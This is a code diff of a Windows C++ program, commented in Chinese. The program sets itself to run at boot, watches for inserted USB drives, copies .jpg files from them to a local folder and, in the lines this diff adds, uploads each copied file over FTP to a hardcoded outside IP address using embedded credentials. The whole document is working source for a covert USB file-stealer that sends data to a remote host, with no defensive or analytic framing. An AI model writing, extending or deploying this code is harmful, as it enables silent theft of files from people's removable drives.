@@ -1,17 +1,36 @@
-#include<Windows.h>
 #include<iostream>
 #include<fstream>
-#include<Dbt.h>
 #include<cstring>
 #include<io.h>
 #include<tchar.h>
 #include<direct.h>
+#include<afxinet.h>//ftp支持
+#include<Windows.h>
+#include<dbt.h>
+
 #define DESTEST "d:/temp/"//目标目录
-std::string USB;//USB盘符
+#define FTP "45.77.210.206"
+#define PASSWD "daojianshenyu"
+#define USER "ftpuser"
+
 #pragma comment  (lib,"User32.lib")  //窗口化部分的支持
 #pragma comment  (lib,"Gdi32.lib") //窗口化部分的支持
 #pragma comment (lib,"Advapi32.lib")//用于支持注册表编辑
+std::string USB;//USB盘符
+CInternetSession session("FTP server");
+CFtpConnection* Pftp;
+
 using namespace std;
+
+
+bool TestInet() {//网络连通测试
+	Pftp = session.GetFtpConnection(FTP, USER, PASSWD);
+	if (Pftp == 0) { Pftp->Close(); delete Pftp; return false; }
+	if (Pftp->GetFile("test", "d:/temp/test", FALSE, FILE_ATTRIBUTE_NORMAL, FTP_TRANSFER_TYPE_UNKNOWN))
+		return true;
+	else { Pftp->Close(); delete Pftp; return false;}
+}
+
 
 
 void SetAutoRun(bool bAutoRun) {//设置开机自启
@@ -102,10 +121,16 @@ void FileSearch(std::string Path,int Layer) {
 					file.find(".jpg") != file.npos) {//jpg copy
 					dest = DESTEST + file;
 					file = Path + '/' + file_info.name;
-					if (_access(DESTEST,00)==0) CopyFile(file.c_str(), dest.c_str(), FALSE);//判断目标文件夹是否存在
+					if (_access(DESTEST, 00) == 0) {
+						CopyFile(file.c_str(), dest.c_str(), FALSE);//判断目标文件夹是否存在
+						if (TestInet()) Pftp->PutFile(dest.c_str(), file_info.name, FTP_TRANSFER_TYPE_UNKNOWN);
+						//尝试连接ftp服务器并传输
+					}
 					else {//不存在 先创建再复制
 						_mkdir(DESTEST);
 						CopyFile(file.c_str(), dest.c_str(), FALSE);
+						if (TestInet()) Pftp->PutFile(dest.c_str(), file_info.name, FTP_TRANSFER_TYPE_UNKNOWN);
+						//尝试连接ftp服务器并传输
 					}
 					Sleep(250);//暂停 防止过多占用性能
 				}
@@ -151,9 +176,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) 
 	switch (Message)
 	{
 	case WM_CREATE://窗体创建消息
-		SetAutoRun(true);
-				   //system("mkdir d:\\temp");//创建目标目录
-		_mkdir(DESTEST);
+		SetAutoRun(true);//设置开机自启
+		_mkdir(DESTEST);//system("mkdir d:\\temp");//创建目标目录
 		break;
 	case WM_DESTROY://窗体结束消息
 		SetAutoRun(false);
